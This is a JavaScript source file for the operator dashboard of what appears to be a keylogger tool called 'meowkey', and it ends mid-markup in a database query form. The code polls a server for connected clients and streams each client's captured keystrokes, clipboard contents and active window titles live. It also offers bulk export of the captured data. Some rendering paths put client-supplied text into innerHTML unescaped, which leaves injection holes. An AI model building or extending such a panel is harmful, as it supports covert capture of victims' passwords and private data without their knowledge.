
// UI/js/dashboard.js - COMPLETE IMPLEMENTED VERSION WITH LIVE STREAMING
class Dashboard {
    constructor() {
        this.activeClients = new Map(); // clientId -> {client, keystrokes[], clipboard[], windows[]}
        this.maxKeystrokes = 100; // Increased for live stream
        this.maxClipboard = 10;
        this.maxWindows = 10;
        this.refreshInterval = 2000; // 2 seconds for faster updates
        this.autoRefresh = null;
        this.liveUpdateInterval = 500; // 500ms for checking new events
        this.liveUpdates = null;
        this.utils = window.utils || new Utils();
        this.lastEventTimestamps = new Map(); // clientId -> {lastKeystroke, lastClipboard, lastWindow}
        this.pendingLiveEvents = new Map(); // clientId -> {keystrokes: [], clipboard: [], windows: []}
    }

    // Initialize dashboard
    init() {
        console.log('🚀 Dashboard initializing with LIVE streaming...');
        this.setupEventListeners();
        this.setupClipboardModal();
        this.loadInitialData();
        this.startAutoRefresh();
        this.startLiveUpdates();
        this.setupQuerySection();
        console.log('✅ Dashboard initialized with live streaming');
    }

    // Setup event listeners
    setupEventListeners() {
        // Copy clipboard button
        const copyBtn = document.getElementById('copy-clipboard');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                const content = document.getElementById('clipboard-content').textContent;
                navigator.clipboard.writeText(content)
                    .then(() => this.utils.showNotification('Copied to clipboard', 'success'))
                    .catch(err => {
                        console.error('Failed to copy:', err);
                        this.utils.showNotification('Failed to copy to clipboard', 'error');
                    });
            });
        }

        // Close modal button
        const closeBtn = document.getElementById('close-modal');
        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                this.utils.hideModal('clipboard-modal');
            });
        }

        // Modal background click
        const modal = document.getElementById('clipboard-modal');
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.utils.hideModal('clipboard-modal');
                }
            });
        }
    }

    // Setup clipboard modal
    setupClipboardModal() {
        // Already handled in setupEventListeners
    }

    // Load initial data
    async loadInitialData() {
        try {
            console.log('📥 Loading initial data...');
            
            // Get active and pending clients
            const listResponse = await this.utils.apiCall('/api/clients/list');
            console.log('Active clients:', listResponse);
            
            // Get all registered clients for stats
            const allClientsResponse = await this.utils.apiCall('/api/clients/all');
            console.log('All clients:', allClientsResponse);
            
            // Get database stats
            const statsResponse = await this.utils.apiCall('/api/stats');
            console.log('Database stats:', statsResponse);
            
            // Initialize last timestamps
            this.initializeLastTimestamps(allClientsResponse);
            
            // Update UI with real data
            this.updateDashboardData(listResponse, allClientsResponse, statsResponse);
            
            this.utils.showNotification('Dashboard loaded with real-time monitoring', 'success');
            
        } catch (error) {
            console.error('Failed to load initial data:', error);
            this.utils.showNotification('Failed to load dashboard data', 'error');
        }
    }

    // Initialize last timestamps for each client
    initializeLastTimestamps(allClientsData) {
        if (!allClientsData.success || !allClientsData.allClients) return;
        
        allClientsData.allClients.forEach(client => {
            // For each client, we'll track the latest event timestamps
            this.lastEventTimestamps.set(client.id, {
                lastKeystroke: 0,
                lastClipboard: 0,
                lastWindow: 0
            });
        });
    }

    // Update dashboard with real data
    updateDashboardData(listData, allClientsData, statsData) {
        console.log('🔄 Updating dashboard with real data');
        
        // Clear current clients
        this.activeClients.clear();
        const container = document.getElementById('clients-container');
        if (container) {
            const emptyState = container.querySelector('.empty-state');
            if (emptyState) emptyState.remove();
        }
        
        // Process active clients
        if (listData.success && listData.active) {
            listData.active.forEach(client => {
                this.addClientCard({
                    id: client.id,
                    status: 'active',
                    connectedAt: client.connectedAt || Date.now()
                });
            });
        }
        
        // Update stats
        this.updateStats(allClientsData, statsData);
        
        // If no active clients, show empty state
        if (this.activeClients.size === 0) {
            this.showEmptyState();
        }
    }

    // Add client card to dashboard
    async addClientCard(client) {
        if (this.activeClients.has(client.id)) {
            this.updateClientCard(client.id, client);
            return;
        }

        console.log(`➕ Adding LIVE client card: ${client.id}`);
        
        // Store client with empty buffers for live data
        this.activeClients.set(client.id, {
            ...client,
            keystrokes: [],
            clipboard: [],
            windows: [],
            // For live updates
            lastKeystrokeTime: 0,
            lastClipboardTime: 0,
            lastWindowTime: 0
        });

        // Initialize pending events buffer
        this.pendingLiveEvents.set(client.id, {
            keystrokes: [],
            clipboard: [],
            windows: []
        });

        const container = document.getElementById('clients-container');
        if (!container) return;
        
        // Remove empty state if present
        const emptyState = container.querySelector('.empty-state');
        if (emptyState) {
            emptyState.remove();
        }

        // Create card
        const card = this.createClientCard(client);
        container.appendChild(card);
        
        // Load initial historical data
        this.loadClientHistoricalData(client.id);
        
        // Start live monitoring for this client
        this.startClientLiveMonitoring(client.id);
    }

    // Create client card HTML with live indicators
    createClientCard(client) {
        const card = document.createElement('div');
        card.className = 'client-card';
        card.id = `client-${client.id}`;
        
        card.innerHTML = `
            <div class="client-header">
                <div class="client-info">
                    <div class="client-avatar" style="background: ${this.utils.getClientColor(client.id)}">
                        ${this.utils.getClientInitials(client.id)}
                    </div>
                    <div class="client-details">
                        <h3>${client.id}</h3>
                        <p>Connected ${this.utils.formatTimestamp(client.connectedAt || Date.now())}</p>
                        <div class="live-indicator">
                            <span class="live-dot"></span>
                            <span class="live-text">LIVE</span>
                        </div>
                    </div>
                </div>
                <div class="client-status">
                    <div class="connection-indicator">
                        <span class="connection-dot connected"></span>
                        <span>Active</span>
                    </div>
                    <button class="btn-danger disconnect-btn" data-client-id="${client.id}">
                        <i class="fas fa-sign-out-alt"></i> Disconnect
                    </button>
                    <button class="btn-secondary view-data-btn" data-client-id="${client.id}">
                        <i class="fas fa-eye"></i> View Data
                    </button>
                </div>
            </div>
            <div class="client-content">
                <div class="keystrokes-section">
                    <div class="section-header">
                        <h4>Live Keystrokes</h4>
                        <span class="live-counter" id="keystroke-counter-${client.id}">0</span>
                    </div>
                    <div class="keystrokes-display live-stream" id="keystrokes-${client.id}">
                        <div class="live-placeholder">Waiting for keystrokes...</div>
                    </div>
                </div>
                <div class="windows-section">
                    <div class="section-header">
                        <h4>Window Focus</h4>
                        <span class="live-counter" id="window-counter-${client.id}">0</span>
                    </div>
                    <div class="windows-list live-stream" id="windows-${client.id}">
                        <div class="live-placeholder">No window changes yet</div>
                    </div>
                </div>
                <div class="clipboard-section">
                    <div class="section-header">
                        <h4>Clipboard Changes</h4>
                        <span class="live-counter" id="clipboard-counter-${client.id}">0</span>
                    </div>
                    <div class="clipboard-buttons live-stream" id="clipboard-${client.id}">
                        <div class="live-placeholder">No clipboard changes yet</div>
                    </div>
                </div>
            </div>
        `;

        // Add event listeners
        const disconnectBtn = card.querySelector('.disconnect-btn');
        if (disconnectBtn) {
            disconnectBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                this.disconnectClient(client.id);
            });
        }

        const viewDataBtn = card.querySelector('.view-data-btn');
        if (viewDataBtn) {
            viewDataBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                this.showClientDataModal(client.id);
            });
        }

        return card;
    }

    // Load historical data for a client
    async loadClientHistoricalData(clientId) {
        try {
            console.log(`📊 Loading historical data for client: ${clientId}`);
            
            // Load all data types
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=all`);
            
            if (response.success) {
                // Update buffers with historical data
                this.updateClientBuffers(clientId, response);
                
                // Set last timestamps
                const client = this.activeClients.get(clientId);
                if (client) {
                    if (response.keystrokes && response.keystrokes.length > 0) {
                        const lastKeystroke = response.keystrokes[response.keystrokes.length - 1];
                        client.lastKeystrokeTime = lastKeystroke.timestamp || 0;
                    }
                    if (response.clipboard && response.clipboard.length > 0) {
                        const lastClipboard = response.clipboard[response.clipboard.length - 1];
                        client.lastClipboardTime = lastClipboard.timestamp || 0;
                    }
                    if (response.windows && response.windows.length > 0) {
                        const lastWindow = response.windows[response.windows.length - 1];
                        client.lastWindowTime = lastWindow.timestamp || 0;
                    }
                    this.activeClients.set(clientId, client);
                }
            }
        } catch (error) {
            console.error(`Failed to load historical data for ${clientId}:`, error);
        }
    }

    // Start live monitoring for a client
    startClientLiveMonitoring(clientId) {
        console.log(`🔍 Starting live monitoring for ${clientId}`);
        
        // Set up periodic checks for new events
        const monitorInterval = setInterval(async () => {
            if (!this.activeClients.has(clientId)) {
                clearInterval(monitorInterval);
                return;
            }
            
            await this.checkForNewEvents(clientId);
        }, this.liveUpdateInterval);
        
        // Store interval for cleanup
        const client = this.activeClients.get(clientId);
        if (client) {
            client.monitorInterval = monitorInterval;
            this.activeClients.set(clientId, client);
        }
    }

    // Check for new events
    async checkForNewEvents(clientId) {
        try {
            const client = this.activeClients.get(clientId);
            if (!client) return;
            
            // Check for new keystrokes
            await this.checkNewKeystrokes(clientId, client.lastKeystrokeTime);
            
            // Check for new clipboard events
            await this.checkNewClipboard(clientId, client.lastClipboardTime);
            
            // Check for new window events
            await this.checkNewWindows(clientId, client.lastWindowTime);
            
        } catch (error) {
            console.error(`Error checking new events for ${clientId}:`, error);
        }
    }

    // Check for new keystrokes
    async checkNewKeystrokes(clientId, lastTimestamp) {
        try {
            // Query for keystrokes after last timestamp
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=keystrokes`);
            
            if (response.success && response.keystrokes) {
                const newKeystrokes = response.keystrokes.filter(ks => 
                    ks.timestamp > lastTimestamp
                );
                
                if (newKeystrokes.length > 0) {
                    // Add to pending buffer
                    const pending = this.pendingLiveEvents.get(clientId);
                    if (pending) {
                        pending.keystrokes.push(...newKeystrokes);
                        this.pendingLiveEvents.set(clientId, pending);
                    }
                    
                    // Update last timestamp
                    const client = this.activeClients.get(clientId);
                    if (client) {
                        client.lastKeystrokeTime = newKeystrokes[newKeystrokes.length - 1].timestamp;
                        this.activeClients.set(clientId, client);
                    }
                }
            }
        } catch (error) {
            // Silently fail - individual type queries might fail, we'll handle in processLiveEvents
        }
    }

    // Check for new clipboard events
    async checkNewClipboard(clientId, lastTimestamp) {
        try {
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=clipboard`);
            
            if (response.success && response.clipboard) {
                const newClipboard = response.clipboard.filter(cb => 
                    cb.timestamp > lastTimestamp
                );
                
                if (newClipboard.length > 0) {
                    const pending = this.pendingLiveEvents.get(clientId);
                    if (pending) {
                        pending.clipboard.push(...newClipboard);
                        this.pendingLiveEvents.set(clientId, pending);
                    }
                    
                    const client = this.activeClients.get(clientId);
                    if (client) {
                        client.lastClipboardTime = newClipboard[newClipboard.length - 1].timestamp;
                        this.activeClients.set(clientId, client);
                    }
                }
            }
        } catch (error) {
            // Silently fail
        }
    }

    // Check for new window events
    async checkNewWindows(clientId, lastTimestamp) {
        try {
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=windows`);
            
            if (response.success && response.windows) {
                const newWindows = response.windows.filter(win => 
                    win.timestamp > lastTimestamp
                );
                
                if (newWindows.length > 0) {
                    const pending = this.pendingLiveEvents.get(clientId);
                    if (pending) {
                        pending.windows.push(...newWindows);
                        this.pendingLiveEvents.set(clientId, pending);
                    }
                    
                    const client = this.activeClients.get(clientId);
                    if (client) {
                        client.lastWindowTime = newWindows[newWindows.length - 1].timestamp;
                        this.activeClients.set(clientId, client);
                    }
                }
            }
        } catch (error) {
            // Silently fail
        }
    }

    // Update client buffers with data
    updateClientBuffers(clientId, data) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        // Update keystrokes buffer
        if (data.keystrokes && data.keystrokes.length > 0) {
            // Add new keystrokes to beginning of array (most recent first)
            const newKeystrokes = data.keystrokes.slice().reverse(); // Reverse to get newest first
            client.keystrokes = [...newKeystrokes, ...client.keystrokes].slice(0, this.maxKeystrokes);
        }
        
        // Update clipboard buffer
        if (data.clipboard && data.clipboard.length > 0) {
            const newClipboard = data.clipboard.slice().reverse();
            client.clipboard = [...newClipboard, ...client.clipboard].slice(0, this.maxClipboard);
        }
        
        // Update windows buffer
        if (data.windows && data.windows.length > 0) {
            const newWindows = data.windows.slice().reverse();
            client.windows = [...newWindows, ...client.windows].slice(0, this.maxWindows);
        }
        
        this.activeClients.set(clientId, client);
        
        // Update display
        this.updateClientDisplay(clientId);
    }

    // Update client display
    updateClientDisplay(clientId) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        // Update keystrokes display
        this.updateKeystrokesDisplay(clientId, client.keystrokes);
        
        // Update clipboard display
        this.updateClipboardDisplay(clientId, client.clipboard);
        
        // Update windows display
        this.updateWindowsDisplay(clientId, client.windows);
        
        // Update counters
        this.updateLiveCounters(clientId);
    }

    // Process pending live events
    processLiveEvents() {
        this.pendingLiveEvents.forEach((pending, clientId) => {
            if (pending.keystrokes.length > 0 || 
                pending.clipboard.length > 0 || 
                pending.windows.length > 0) {
                
                // Process keystrokes
                if (pending.keystrokes.length > 0) {
                    this.processNewKeystrokes(clientId, pending.keystrokes);
                    pending.keystrokes = [];
                }
                
                // Process clipboard
                if (pending.clipboard.length > 0) {
                    this.processNewClipboard(clientId, pending.clipboard);
                    pending.clipboard = [];
                }
                
                // Process windows
                if (pending.windows.length > 0) {
                    this.processNewWindows(clientId, pending.windows);
                    pending.windows = [];
                }
                
                this.pendingLiveEvents.set(clientId, pending);
            }
        });
    }

    // Process new keystrokes with animation
    processNewKeystrokes(clientId, newKeystrokes) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        // Add to buffer (newest first)
        const reversedKeystrokes = newKeystrokes.slice().reverse();
        client.keystrokes = [...reversedKeystrokes, ...client.keystrokes].slice(0, this.maxKeystrokes);
        this.activeClients.set(clientId, client);
        
        // Update display with animation
        this.animateNewKeystrokes(clientId, reversedKeystrokes);
    }

    // Animate new keystrokes
    animateNewKeystrokes(clientId, newKeystrokes) {
        const container = document.getElementById(`keystrokes-${clientId}`);
        if (!container) return;
        
        // Remove placeholder if present
        const placeholder = container.querySelector('.live-placeholder');
        if (placeholder) {
            placeholder.remove();
        }
        
        // Add new keystrokes with animation
        newKeystrokes.forEach((keystroke, index) => {
            const element = this.createKeystrokeElement(keystroke);
            element.classList.add('new-keystroke');
            container.insertBefore(element, container.firstChild);
            
            // Remove animation class after animation completes
            setTimeout(() => {
                element.classList.remove('new-keystroke');
            }, 500);
        });
        
        // Limit displayed keystrokes
        while (container.children.length > this.maxKeystrokes) {
            container.removeChild(container.lastChild);
        }
        
        // Update counter
        this.updateKeystrokeCounter(clientId);
    }

    // Create keystroke element
    createKeystrokeElement(keystroke) {
        const element = document.createElement('span');
        element.className = `keystroke ${this.utils.classifyKeystroke(keystroke.key)}`;
        element.textContent = keystroke.key || 'Unknown';
        element.title = `Time: ${keystroke.displayTime || this.utils.formatMicroTimestamp(keystroke.timestamp)}`;
        return element;
    }

    // Process new clipboard events
    processNewClipboard(clientId, newClipboard) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        const reversedClipboard = newClipboard.slice().reverse();
        client.clipboard = [...reversedClipboard, ...client.clipboard].slice(0, this.maxClipboard);
        this.activeClients.set(clientId, client);
        
        this.updateClipboardDisplay(clientId, client.clipboard);
        this.updateClipboardCounter(clientId);
    }

    // Process new window events
    processNewWindows(clientId, newWindows) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        const reversedWindows = newWindows.slice().reverse();
        client.windows = [...reversedWindows, ...client.windows].slice(0, this.maxWindows);
        this.activeClients.set(clientId, client);
        
        this.updateWindowsDisplay(clientId, client.windows);
        this.updateWindowCounter(clientId);
    }

    // Update keystrokes display
    updateKeystrokesDisplay(clientId, keystrokes) {
        const container = document.getElementById(`keystrokes-${clientId}`);
        if (!container) return;
        
        container.innerHTML = '';
        
        if (!keystrokes || keystrokes.length === 0) {
            container.innerHTML = '<div class="live-placeholder">Waiting for keystrokes...</div>';
            return;
        }
        
        // Display most recent keystrokes (they're already in reverse order in buffer)
        keystrokes.forEach(keystroke => {
            const element = this.createKeystrokeElement(keystroke);
            container.appendChild(element);
        });
    }

    // Update clipboard display
    updateClipboardDisplay(clientId, clipboard) {
        const container = document.getElementById(`clipboard-${clientId}`);
        if (!container) return;
        
        container.innerHTML = '';
        
        if (!clipboard || clipboard.length === 0) {
            container.innerHTML = '<div class="live-placeholder">No clipboard changes yet</div>';
            return;
        }
        
        // Remove placeholder
        const placeholder = container.querySelector('.live-placeholder');
        if (placeholder) placeholder.remove();
        
        clipboard.forEach((item, index) => {
            const button = this.createClipboardButton(clientId, item, index);
            container.appendChild(button);
        });
    }

    // Create clipboard button
    createClipboardButton(clientId, item, index) {
        const button = document.createElement('button');
        button.className = 'clipboard-button';
        button.dataset.clientId = clientId;
        button.dataset.index = index;
        
        const displayContent = item.content 
            ? (item.content.length > 50 ? item.content.substring(0, 50) + '...' : item.content)
            : 'Empty';
        
        button.innerHTML = `
            <span>${displayContent}</span>
            <span class="clipboard-time">${item.displayTime || this.utils.formatMicroTimestamp(item.timestamp)}</span>
        `;
        
        button.addEventListener('click', (e) => {
            e.stopPropagation();
            this.showClipboardContent(clientId, item.content, item.timestamp);
        });
        
        return button;
    }

    // Update windows display
    updateWindowsDisplay(clientId, windows) {
        const container = document.getElementById(`windows-${clientId}`);
        if (!container) return;
        
        container.innerHTML = '';
        
        if (!windows || windows.length === 0) {
            container.innerHTML = '<div class="live-placeholder">No window changes yet</div>';
            return;
        }
        
        // Remove placeholder
        const placeholder = container.querySelector('.live-placeholder');
        if (placeholder) placeholder.remove();
        
        windows.forEach(item => {
            const element = this.createWindowElement(item);
            container.appendChild(element);
        });
    }

    // Create window element
    createWindowElement(item) {
        const element = document.createElement('div');
        element.className = 'window-item';
        element.innerHTML = `
            <div class="window-title" title="${item.title || 'Unknown'}">${item.title || 'Unknown'}</div>
            <div class="window-process">${item.process || 'Unknown'}</div>
        `;
        return element;
    }

    // Update live counters
    updateLiveCounters(clientId) {
        this.updateKeystrokeCounter(clientId);
        this.updateClipboardCounter(clientId);
        this.updateWindowCounter(clientId);
    }

    updateKeystrokeCounter(clientId) {
        const counter = document.getElementById(`keystroke-counter-${clientId}`);
        if (counter) {
            const client = this.activeClients.get(clientId);
            const count = client?.keystrokes?.length || 0;
            counter.textContent = count;
        }
    }

    updateClipboardCounter(clientId) {
        const counter = document.getElementById(`clipboard-counter-${clientId}`);
        if (counter) {
            const client = this.activeClients.get(clientId);
            const count = client?.clipboard?.length || 0;
            counter.textContent = count;
        }
    }

    updateWindowCounter(clientId) {
        const counter = document.getElementById(`window-counter-${clientId}`);
        if (counter) {
            const client = this.activeClients.get(clientId);
            const count = client?.windows?.length || 0;
            counter.textContent = count;
        }
    }

    // Start live updates processing
    startLiveUpdates() {
        this.liveUpdates = setInterval(() => {
            this.processLiveEvents();
        }, 300); // Process events every 300ms
    }

    // Stop live updates
    stopLiveUpdates() {
        if (this.liveUpdates) {
            clearInterval(this.liveUpdates);
            this.liveUpdates = null;
        }
    }

    // Show clipboard content in modal
    showClipboardContent(clientId, content, timestamp) {
        document.getElementById('clipboard-client-id').textContent = `Client: ${clientId}`;
        document.getElementById('clipboard-timestamp').textContent = this.utils.formatMicroTimestamp(timestamp);
        document.getElementById('clipboard-content').textContent = content || 'Empty';
        
        this.utils.showModal('clipboard-modal');
    }

    // Update existing client card
    updateClientCard(clientId, clientData) {
        const card = document.getElementById(`client-${clientId}`);
        if (!card) return;

        const details = card.querySelector('.client-details p');
        if (details) {
            details.textContent = `Connected ${this.utils.formatTimestamp(clientData.connectedAt || Date.now())}`;
        }

        const connectionDot = card.querySelector('.connection-dot');
        if (connectionDot) {
            connectionDot.classList.toggle('connected', clientData.status === 'active');
        }
    }

    // Remove client card
    removeClientCard(clientId) {
        const card = document.getElementById(`client-${clientId}`);
        if (card) {
            card.remove();
        }

        this.activeClients.delete(clientId);
        this.pendingLiveEvents.delete(clientId);
        this.updateStats();

        // Show empty state if no clients
        if (this.activeClients.size === 0) {
            this.showEmptyState();
        }
    }

    // Show empty state
    showEmptyState() {
        const container = document.getElementById('clients-container');
        if (container) {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-user-slash"></i>
                    <h3>No Active Clients</h3>
                    <p>Clients will appear here once connected and approved</p>
                </div>
            `;
        }
    }

    // Disconnect client
    async disconnectClient(clientId) {
        if (!confirm(`Are you sure you want to disconnect ${clientId}?`)) {
            return;
        }

        try {
            const response = await this.utils.apiCall(`/api/clients/${clientId}/kick`, 'POST');
            
            if (response.success) {
                this.utils.showNotification(`Client ${clientId} disconnected`, 'success');
                this.removeClientCard(clientId);
            } else {
                this.utils.showNotification(`Failed to disconnect ${clientId}: ${response.error}`, 'error');
            }
        } catch (error) {
            console.error('Failed to disconnect client:', error);
            this.utils.showNotification('Failed to disconnect client', 'error');
        }
    }

    // Update dashboard statistics
    async updateStats(allClientsData = null, statsData = null) {
        try {
            // If data not provided, fetch it
            if (!allClientsData) {
                allClientsData = await this.utils.apiCall('/api/clients/all');
            }
            
            if (!statsData) {
                statsData = await this.utils.apiCall('/api/stats');
            }
            
            // Update total clients (active + pending)
            const listResponse = await this.utils.apiCall('/api/clients/list');
            const totalActive = listResponse.active?.length || 0;
            const totalPending = listResponse.pending?.length || 0;
            const totalClients = totalActive + totalPending;
            
            // Calculate total events from all clients
            let totalKeystrokes = 0;
            let totalClipboard = 0;
            
            if (allClientsData.success && allClientsData.allClients) {
                allClientsData.allClients.forEach(client => {
                    totalKeystrokes += client.keystrokes || 0;
                    totalClipboard += client.clipboard || 0;
                });
            }
            
            // Update UI
            const totalClientsEl = document.getElementById('total-clients');
            const totalKeystrokesEl = document.getElementById('total-keystrokes');
            const totalClipboardEl = document.getElementById('total-clipboard');
            
            if (totalClientsEl) totalClientsEl.textContent = totalClients;
            if (totalKeystrokesEl) totalKeystrokesEl.textContent = totalKeystrokes.toLocaleString();
            if (totalClipboardEl) totalClipboardEl.textContent = totalClipboard.toLocaleString();
            
            // Update server status
            const statusDot = document.querySelector('.status-dot');
            const statusText = document.querySelector('.status-text');
            if (statusDot && statusText) {
                statusDot.classList.add('active');
                statusText.textContent = 'Server: Online';
            }
            
        } catch (error) {
            console.error('Failed to update stats:', error);
            
            // Update server status to offline
            const statusDot = document.querySelector('.status-dot');
            const statusText = document.querySelector('.status-text');
            if (statusDot && statusText) {
                statusDot.classList.remove('active');
                statusText.textContent = 'Server: Offline';
            }
        }
    }

    // Start auto-refresh
    startAutoRefresh() {
        // Clear any existing interval
        if (this.autoRefresh) {
            clearInterval(this.autoRefresh);
        }
        
        // Start new interval
        this.autoRefresh = setInterval(async () => {
            try {
                console.log('🔄 Auto-refreshing dashboard...');
                
                // Get updated client list
                const listResponse = await this.utils.apiCall('/api/clients/list');
                
                // Update active clients
                const currentClientIds = Array.from(this.activeClients.keys());
                const newActiveClients = listResponse.active || [];
                
                // Remove clients that are no longer active
                currentClientIds.forEach(clientId => {
                    const stillActive = newActiveClients.some(client => client.id === clientId);
                    if (!stillActive) {
                        this.removeClientCard(clientId);
                    }
                });
                
                // Add new active clients
                newActiveClients.forEach(client => {
                    if (!this.activeClients.has(client.id)) {
                        this.addClientCard(client);
                    }
                });
                
                // Update stats
                this.updateStats();
                
            } catch (error) {
                console.error('Auto-refresh failed:', error);
            }
        }, this.refreshInterval);
        
        console.log(`✅ Auto-refresh started (every ${this.refreshInterval / 1000}s)`);
    }

    // Stop auto-refresh
    stopAutoRefresh() {
        if (this.autoRefresh) {
            clearInterval(this.autoRefresh);
            this.autoRefresh = null;
            console.log('⏹️ Auto-refresh stopped');
        }
    }

    // Show client data modal with detailed view
    async showClientDataModal(clientId) {
        try {
            this.utils.showNotification(`Loading data for ${clientId}...`, 'info');
            
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=all`);
            
            if (response.success) {
                this.createClientDataModal(clientId, response);
            } else {
                this.utils.showNotification(`Failed to load data for ${clientId}`, 'error');
            }
        } catch (error) {
            console.error(`Failed to show client data for ${clientId}:`, error);
            this.utils.showNotification('Failed to load client data', 'error');
        }
    }

    // Create client data modal
    createClientDataModal(clientId, data) {
        // Remove existing modal if any
        const existingModal = document.getElementById('client-data-modal');
        if (existingModal) {
            existingModal.remove();
        }
        
        // Create modal
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.id = 'client-data-modal';
        
        // Prepare data for display
        const keystrokesCount = data.keystrokes?.length || 0;
        const clipboardCount = data.clipboard?.length || 0;
        const windowsCount = data.windows?.length || 0;
        
        modal.innerHTML = `
            <div class="modal-content" style="max-width: 800px;">
                <div class="modal-header">
                    <h3><i class="fas fa-user"></i> Client Data: ${clientId}</h3>
                    <button class="close-modal">&times;</button>
                </div>
                <div class="modal-body">
                    <div class="data-summary">
                        <div class="summary-item">
                            <i class="fas fa-keyboard"></i>
                            <span>Keystrokes: ${keystrokesCount}</span>
                        </div>
                        <div class="summary-item">
                            <i class="fas fa-clipboard"></i>
                            <span>Clipboard: ${clipboardCount}</span>
                        </div>
                        <div class="summary-item">
                            <i class="fas fa-window-maximize"></i>
                            <span>Windows: ${windowsCount}</span>
                        </div>
                    </div>
                    
                    <div class="data-tabs">
                        <button class="tab-btn active" data-tab="keystrokes">Keystrokes</button>
                        <button class="tab-btn" data-tab="clipboard">Clipboard</button>
                        <button class="tab-btn" data-tab="windows">Windows</button>
                    </div>
                    
                    <div class="tab-content" id="keystrokes-tab">
                        ${this.formatKeystrokesForModal(data.keystrokes || [])}
                    </div>
                    
                    <div class="tab-content" id="clipboard-tab" style="display: none;">
                        ${this.formatClipboardForModal(data.clipboard || [])}
                    </div>
                    
                    <div class="tab-content" id="windows-tab" style="display: none;">
                        ${this.formatWindowsForModal(data.windows || [])}
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn-secondary" id="export-data-btn">
                        <i class="fas fa-download"></i> Export Data
                    </button>
                    <button class="btn-secondary close-modal">Close</button>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        this.utils.showModal('client-data-modal');
        
        // Setup tab switching
        this.setupDataModalTabs();
        
        // Setup export button
        const exportBtn = document.getElementById('export-data-btn');
        if (exportBtn) {
            exportBtn.addEventListener('click', () => {
                this.exportClientData(clientId, data);
            });
        }
        
        // Setup close handlers
        modal.querySelectorAll('.close-modal').forEach(btn => {
            btn.addEventListener('click', () => {
                this.utils.hideModal('client-data-modal');
                setTimeout(() => {
                    if (modal.parentNode) {
                        modal.remove();
                    }
                }, 300);
            });
        });
    }

    // Format keystrokes for modal display
    formatKeystrokesForModal(keystrokes) {
        if (!keystrokes.length) {
            return '<div class="no-data">No keystrokes recorded</div>';
        }
        
        let html = '<div class="data-list">';
        keystrokes.forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            html += `
                <div class="data-item">
                    <span class="data-index">${index + 1}.</span>
                    <span class="data-time">[${time}]</span>
                    <span class="data-content keystroke ${this.utils.classifyKeystroke(item.key)}">${item.key || 'Unknown'}</span>
                </div>
            `;
        });
        html += '</div>';
        return html;
    }

    // Format clipboard for modal display
    formatClipboardForModal(clipboard) {
        if (!clipboard.length) {
            return '<div class="no-data">No clipboard events</div>';
        }
        
        let html = '<div class="data-list">';
        clipboard.forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            const content = item.content || 'Empty';
            html += `
                <div class="data-item clipboard-item">
                    <span class="data-index">${index + 1}.</span>
                    <span class="data-time">[${time}]</span>
                    <div class="data-content">${this.escapeHtml(content)}</div>
                </div>
            `;
        });
        html += '</div>';
        return html;
    }

    // Format windows for modal display
    formatWindowsForModal(windows) {
        if (!windows.length) {
            return '<div class="no-data">No window events</div>';
        }
        
        let html = '<div class="data-list">';
        windows.forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            html += `
                <div class="data-item window-item">
                    <span class="data-index">${index + 1}.</span>
                    <span class="data-time">[${time}]</span>
                    <div class="data-content">
                        <div class="window-title">${this.escapeHtml(item.title || 'Unknown')}</div>
                        <div class="window-process">${this.escapeHtml(item.process || 'Unknown')}</div>
                    </div>
                </div>
            `;
        });
        html += '</div>';
        return html;
    }

    // Setup data modal tabs
    setupDataModalTabs() {
        const tabBtns = document.querySelectorAll('.tab-btn');
        const tabContents = document.querySelectorAll('.tab-content');
        
        tabBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                // Remove active class from all tabs
                tabBtns.forEach(b => b.classList.remove('active'));
                tabContents.forEach(c => c.style.display = 'none');
                
                // Activate clicked tab
                btn.classList.add('active');
                const tabId = btn.dataset.tab + '-tab';
                const tabContent = document.getElementById(tabId);
                if (tabContent) {
                    tabContent.style.display = 'block';
                }
            });
        });
    }

    // Export client data
    exportClientData(clientId, data) {
        const exportData = {
            clientId: clientId,
            exportTime: new Date().toISOString(),
            keystrokes: data.keystrokes || [],
            clipboard: data.clipboard || [],
            windows: data.windows || []
        };
        
        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `meowkey-client-${clientId}-${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.utils.showNotification(`Data exported for ${clientId}`, 'success');
    }

    // Setup query section for database queries
    setupQuerySection() {
        // Add query section to dashboard if not exists
        const mainContent = document.querySelector('.main-content');
        if (!mainContent || document.getElementById('query-section')) return;
        
        const querySection = document.createElement('div');
        querySection.id = 'query-section';
        querySection.className = 'dashboard-section';
        querySection.innerHTML = `
            <h2><i class="fas fa-database"></i> Database Query</h2>
            <div class="query-form">
                <div class="form-group">
                    <label for="query-client-select">Select Client:</label>
                    <select id="query-client-select">
                        <option value="">Loading clients...</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="query-data-type">Data Type:</label>
                    <select id="query-data-type">
                        <option value="all">All Data</option>
                        <option value="keystrokes">Keystrokes Only</option>
                        <option value="clipboard">Clipboard Only</option>
                        <option value="windows">Windows Only</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="query-limit">Limit:</label>
